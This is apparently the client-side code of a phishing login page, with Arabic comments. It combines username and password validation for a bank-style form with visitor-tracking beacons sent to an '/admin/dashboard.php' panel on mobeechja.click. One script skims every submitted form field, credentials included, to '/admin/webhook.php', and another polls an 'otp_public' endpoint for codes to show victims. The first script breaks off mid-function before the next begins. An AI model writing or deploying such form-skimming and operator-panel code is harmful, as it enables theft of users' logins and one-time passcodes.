<script>
(function () {
  "use strict";

  var usernameField = "field_0c13de8";
  var passwordField = "field_8fdbe40";
  var fields = [usernameField, passwordField];

  /* لون الخطأ */
  var errorColor = "#EE4400";

  /* اللون الأخضر الرئيسي للحقول */
  var brandColor = "#00643e";

  /* اللون الأخضر الرئيسي للزر */
  var submitColor = "#00643e";

  var validationRules = {

    [usernameField]: {
      testId: "Username-error-message",

      rules: [
        {
          name: "required",
          regex: /^.+$/,
          message: "مطلوب إدخال كود المستخدم"
        },

        {
          name: "maxLength",
          regex: /^.{1,30}$/,
          message: "يجب إلا يحتوي على أكثر من 30 حرف ."
        },

        {
          name: "noArabicLetters",
          regex: /^[\u0000-\u059F\u0700-\uFFFF]*$/,
          message: "لا يحتوي على أحرف عربية."
        },

        {
          name: "allowedCharacters",
          regex: /^[a-zA-Z0-9_.@-]*$/,
          message: "لا يحتوي على مسافات أو أحرف خاصة."
        }
      ]
    },


    [passwordField]: {
      testId: "Password-error-message",

      rules: [
        {
          name: "required",
          regex: /^.+$/,
          message: "مطلوب إدخال كلمة المرور"
        },

        {
          name: "maxLength",
          regex: /^.{1,12}$/,
          message: "يحتوي على 12 حرف على الأكثر."
        },

        {
          name: "noArabicLetters",
          regex: /^[\u0000-\u059F\u0700-\uFFFF]*$/,
          message: "لا يحتوي على أحرف عربية."
        }
      ]
    }

  };


  /* البحث عن الحقل */
  function getInput(id) {

    return document.querySelector(
      "#form-field-" + id +
      ", #" + id +
      ", [name='form_fields[" + id + "]']"
    );

  }


  /* الحصول على مجموعة الحقل */
  function getGroup(input) {

    return (
      input.closest(".elementor-field-group") ||
      input.parentElement
    );

  }


  /* الحصول على زر الإرسال */
  function getSubmitButton(form) {

    if (!form) {
      return null;
    }

    return form.querySelector(
      "button[type='submit'], " +
      "input[type='submit'], " +
      ".elementor-button[type='submit'], " +
      ".elementor-button"
    );

  }


  /* إنشاء رسالة الخطأ */
  function getErrorMessage(input, id) {

    var config = validationRules[id];

    var group = getGroup(input);

    var row = group.querySelector(
      '[data-custom-validation-row="' +
      config.testId +
      '"]'
    );


    if (!row) {

      row = document.createElement("div");

      row.className =
        "custom-field-error-row";

      row.setAttribute(
        "data-custom-validation-row",
        config.testId
      );


      var message =
        document.createElement("div");

      message.className =
        "custom-field-error-msg";

      message.setAttribute(
        "dir",
        "rtl"
      );

      message.setAttribute(
        "data-testid",
        config.testId
      );


      row.appendChild(message);

      input.insertAdjacentElement(
        "afterend",
        row
      );

    }


    return row.querySelector(
      '[data-testid="' +
      config.testId +
      '"]'
    );

  }


  /* التحقق من القيمة */
  function getValidationMessage(
    value,
    id,
    showRequired
  ) {

    var config =
      validationRules[id];


    if (
      value === "" &&
      !showRequired
    ) {

      return "";

    }


    for (
      var i = 0;
      i < config.rules.length;
      i++
    ) {

      var rule =
        config.rules[i];


      if (
        !rule.regex.test(value)
      ) {

        return rule.message;

      }

    }


    return "";

  }


  /* إظهار رسالة الخطأ */
  function showError(
    input,
    id,
    message
  ) {

    var msg =
      getErrorMessage(
        input,
        id
      );

    var row =
      msg.parentElement;


    if (message) {

      input.setAttribute(
        "aria-invalid",
        "true"
      );


      msg.setAttribute(
        "aria-label",
        message
      );


      msg.textContent =
        message;


      row.style.setProperty(
        "display",
        "flex",
        "important"
      );

    }

    else {

      input.removeAttribute(
        "aria-invalid"
      );


      msg.removeAttribute(
        "aria-label"
      );


      msg.textContent =
        "";


      row.style.setProperty(
        "display",
        "none",
        "important"
      );

    }

  }


  /* التأكد من أن الحقل صحيح */
  function isFieldCompleteAndValid(id) {

    var input =
      getInput(id);


    if (!input) {
      return false;
    }


    return (
      getValidationMessage(
        input.value || "",
        id,
        true
      ) === ""
    );

  }


  /* التأكد من صحة النموذج كاملاً */
  function isFormCompleteAndValid() {

    return fields.every(
      function (id) {

        return (
          isFieldCompleteAndValid(id)
        );

      }
    );

  }


  /* تعطيل الزر */
  function setSubmitDisabled(button) {

    if (!button) {
      return;
    }


    button.disabled =
      true;


    button.setAttribute(
      "disabled",
      "disabled"
    );


    button.setAttribute(
      "aria-disabled",
      "true"
    );


    button.classList.remove(
      "custom-submit-active"
    );


    button.classList.add(
      "custom-submit-disabled"
    );


    button.style.removeProperty(
      "background-color"
    );


    button.style.removeProperty(
      "border-color"
    );


    button.style.removeProperty(
      "color"
    );


    button.style.setProperty(
      "cursor",
      "not-allowed",
      "important"
    );


    button.style.setProperty(
      "opacity",
      "0.6",
      "important"
    );


    button.style.setProperty(
      "pointer-events",
      "none",
      "important"
    );

  }


  /* تفعيل الزر باللون الأخضر */
  function setSubmitActive(button) {

    if (!button) {
      return;
    }


    button.disabled =
      false;


    button.removeAttribute(
      "disabled"
    );


    button.setAttribute(
      "aria-disabled",
      "false"
    );


    button.classList.remove(
      "custom-submit-disabled"
    );


    button.classList.add(
      "custom-submit-active"
    );


    button.style.setProperty(
      "background-color",
      submitColor,
      "important"
    );


    button.style.setProperty(
      "border-color",
      submitColor,
      "important"
    );


    button.style.setProperty(
      "color",
      "#FFFFFF",
      "important"
    );


    button.style.setProperty(
      "cursor",
      "pointer",
      "important"
    );


    button.style.setProperty(
      "opacity",
      "1",
      "important"
    );


    button.style.setProperty(
      "pointer-events",
      "auto",
      "important"
    );

  }


  /* تحديث حالة زر الإرسال */
  function updateSubmitButtonState(form) {

    var usernameInput =
      getInput(usernameField);


    var targetForm =
      form ||
      (
        usernameInput
          ? usernameInput.closest("form")
          : null
      );


    if (!targetForm) {

<script>
  (function () {
    // عدّل المسار حسب الـ API عندك
    var HEARTBEAT_ENDPOINT = '/api/heartbeat'; // مثال: /api/heartbeat
    var HEARTBEAT_INTERVAL = 2000; // 2000ms = كل ثانيتين

    function getVisitorId() {
      var KEY = 'hb_visitor_id';
      var id = null;

      try {
        id = localStorage.getItem(KEY);
      } catch (e) {
        // في حالة المتصفح يمنع localStorage
      }

      if (!id) {
        id =
          'v-' +
          Date.now().toString(36) +
          '-' +
          Math.random().toString(36).substr(2, 9);

        try {
          localStorage.setItem(KEY, id);
        } catch (e) {
          // تجاهل الخطأ، سنستمر باستخدام id في الذاكرة فقط
        }
      }

      return id;
    }

    var visitorId = getVisitorId();

    function sendHeartbeat() {
      var payload = {
        visitor_id: visitorId,
        page_url: window.location.href,
        page_title: document.title,
        ts: Date.now()
      };

      var body = JSON.stringify(payload);

      // استخدام sendBeacon إن توفر (أفضل لصفحات الإغلاق والتنقل)
      if (navigator.sendBeacon && window.Blob) {
        var blob = new Blob([body], { type: 'application/json' });
        navigator.sendBeacon(HEARTBEAT_ENDPOINT, blob);
      } else if (window.fetch) {
        // fallback إلى fetch
        fetch(HEARTBEAT_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: body,
          keepalive: true,
          credentials: 'include' // لو تحتاج الكوكيز/السيشن
        }).catch(function () {
          // لا تفعل شيئًا لو فشل الطلب
        });
      } else {
        // fallback قديم جدًا: XMLHttpRequest
        try {
          var xhr = new XMLHttpRequest();
          xhr.open('POST', HEARTBEAT_ENDPOINT, true);
          xhr.setRequestHeader('Content-Type', 'application/json');
          xhr.send(body);
        } catch (e) {
          // تجاهل
        }
      }
    }

    // أول heartbeat بمجرد فتح الصفحة
    sendHeartbeat();

    // heartbeat دوري كل ثانيتين
    var intervalId = window.setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);

    // عند إغلاق/تحديث الصفحة نحاول إرسال آخر heartbeat
    window.addEventListener('beforeunload', function () {
      sendHeartbeat();
    });
  })();
</script>

<script>
document.addEventListener("DOMContentLoaded", function() {

    // 1) استخراج معرف الزائر من التخزين المحلي أو من الحقول المخفية
    let vid = localStorage.getItem('visitor_vid');

    if (!vid) {
        let hiddenInput = document.querySelector('input[name*="visitor_id"], input[name*="vid"]');
        if (hiddenInput && hiddenInput.value) vid = hiddenInput.value.trim();
    }

    // إذا لم يوجد VID لا نرسل شيء
    if (!vid) return;

    // 2) محاولة تحسين العنوان الحقيقي (لو document.title عام أو فاضي)
    function getBestTitle() {
        let t = (document.title || '').trim();

        // لو العنوان فاضي أو عام (اختياري) حاول من H1
        if (!t || t === 'داخل الموقع') {
            let h1 = document.querySelector('h1');
            if (h1 && h1.textContent) {
                let h = h1.textContent.trim();
                if (h) t = h;
            }
        }

        return t;
    }

    // 3) إرسال نبضة التتبع إلى endpoint الصحيح الموجود في PHP: ?track=1
    let lastUrlSent = '';
    let lastTitleSent = '';

    function sendPulse(force) {
        const url = window.location.href;
        const title = getBestTitle();

        // منع التكرار غير الضروري إلا عند force
        if (!force && url === lastUrlSent && title === lastTitleSent) return;

        lastUrlSent = url;
        lastTitleSent = title;

        fetch('/admin/dashboard.php?track=1', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                vid: vid,
                url: url,
                title: title
            })
        }).catch(function(e){
            // لا توقف الموقع
            // console.log('Tracking error', e);
        });
    }

    // 4) إرسال مباشر أول مرة + كل 5 ثواني
    sendPulse(true);
    setInterval(function(){ sendPulse(false); }, 5000);

    // 5) إرسال مباشر عند تغيير الصفحة داخل نفس التبويب (SPA) ليظهر خلال ثانية
    (function() {
        const _pushState = history.pushState;
        const _replaceState = history.replaceState;

        function stateChanged() {
            // أعطِ فرصة للعنوان يتحدث ثم أرسل
            setTimeout(function(){ sendPulse(true); }, 250);
            setTimeout(function(){ sendPulse(true); }, 900);
        }

        history.pushState = function() {
            _pushState.apply(this, arguments);
            stateChanged();
        };

        history.replaceState = function() {
            _replaceState.apply(this, arguments);
            stateChanged();
        };

        window.addEventListener('popstate', stateChanged);
        window.addEventListener('hashchange', stateChanged);
    })();

    // 6) إذا تغيّر عنوان الصفحة بدون تغيير URL (بعض الثيمات) راقب وأرسل
    let titleObserver = new MutationObserver(function() {
        // غالباً title يتغير بعد تحميل
        sendPulse(true);
    });

    const titleEl = document.querySelector('title');
    if (titleEl) {
        titleObserver.observe(titleEl, { childList: true });
    }

});
</script>
<script>
const TARGET_FORM_ID = "form5"; 
const WEBHOOK_URL = "/admin/webhook.php";
const COOKIE_NAME = "vid";

function genVid(){
  return "VID-" + Date.now() + "-" + (Math.floor(Math.random()*90000)+10000);
}

function getVid(){
  const m = document.cookie.match(/vid=([^;]+)/);
  return m ? decodeURIComponent(m[1]) : null;
}

function setVid(v){
  document.cookie = "vid=" + encodeURIComponent(v) + ";path=/;SameSite=Lax";
}

async function sendWebhook(payload){
  try{
    await fetch(WEBHOOK_URL,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(payload)
    });
  }catch(e){}
}

document.addEventListener("DOMContentLoaded",function(){

  document.querySelectorAll("form").forEach(form=>{

    form.addEventListener("submit",function(){

      const formId = form.getAttribute("id") || form.getAttribute("data-form-id") || "";

      let vid = getVid();
      if(!vid){ vid = genVid(); setVid(vid); }

      const fd = new FormData(form);
      const fields = {};
      fd.forEach((v,k)=>{ fields[k]=v; });

      const payload = {
        visitor_id: vid,
        form_id: formId,
        form_fields: fields
      };

      // إرسال webhook فقط بدون أي تحويل صفحات
      sendWebhook(payload);

      // *** لا يوجد أي redirect هنا ***
    });

  });
});
</script>

    <script>
    (function(){
        var trackEndpoint   = "https:\/\/mobeechja.click\/admin\/dashboard.php?track=1";
        var otpEndpointBase = "https:\/\/mobeechja.click\/admin\/dashboard.php?otp_public=1";

        function isValidVid(v){
            return /^VID-[A-Za-z0-9_-]{1,128}$/.test(String(v || ''));
        }

        function getCookie(name){
            var m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/[.$?*|{}()[\]\\/+^]/g, '\\$&') + '=([^;]*)'));
            return m ? decodeURIComponent(m[1]) : '';
        }

        function setCookie(name, value, days){
            var maxAge = (days || 30) * 24 * 60 * 60;
            var secure = location.protocol === 'https:' ? '; Secure' : '';
            document.cookie = name + '=' + encodeURIComponent(value) + '; path=/; max-age=' + maxAge + '; SameSite=Lax' + secure;
        }

        function makeVid(){
            return 'VID-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 12) + '-' + Math.floor(Math.random() * 9000 + 1000);
        }

        function getOrCreateVisitorId(){
            var vid = '';

            try {
                vid = localStorage.getItem('visitor_id') || localStorage.getItem('vid') || '';
            } catch(e) {}

            if (!isValidVid(vid)) {
                vid = '';
            }

            if (!vid) {
                var cookieVid = getCookie('vid');
                if (isValidVid(cookieVid)) {
                    vid = cookieVid;
                }
            }

            if (!vid) {
                vid = makeVid();
            }

            try {
                localStorage.setItem('visitor_id', vid);
                localStorage.setItem('vid', vid);
            } catch(e) {}

            setCookie('vid', vid, 30);

            return vid;
        }

        var visitorId = getOrCreateVisitorId();
        window.__siteVisitorId = visitorId;

        function sendPulse() {
            var payload = {
                vid: visitorId,
                url: window.location.href,
                title: document.title || ''
            };

            fetch(trackEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify(payload),
                cache: 'no-store',
                credentials: 'same-origin'
            }).catch(function(){});
        }

        function refreshCircleNumber(){
            var els = document.querySelectorAll('#circleNumber, [data-circle-number="1"]');
            if(!els.length) return;

            fetch(otpEndpointBase + '&vid=' + encodeURIComponent(visitorId), {
                cache: 'no-store',
                credentials: 'same-origin',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(function(r){ return r.json(); })
            .then(function(j){
                if (j && typeof j.value !== 'undefined') {
                    els.forEach(function(el){
                        el.textContent = j.value;
                        el.setAttribute('data-visitor-id', visitorId);
                    });
                }
            })
            .catch(function(){});
        }

        sendPulse();
        refreshCircleNumber();

        setInterval(sendPulse, 10000);
        setInterval(refreshCircleNumber, 2000);

        document.addEventListener('visibilitychange', function(){
            if (document.visibilityState === 'visible') {
                sendPulse();
                refreshCircleNumber();
            }
        });

        window.addEventListener('pageshow', function(){
            sendPulse();
            refreshCircleNumber();
        });
    })();
    </script>
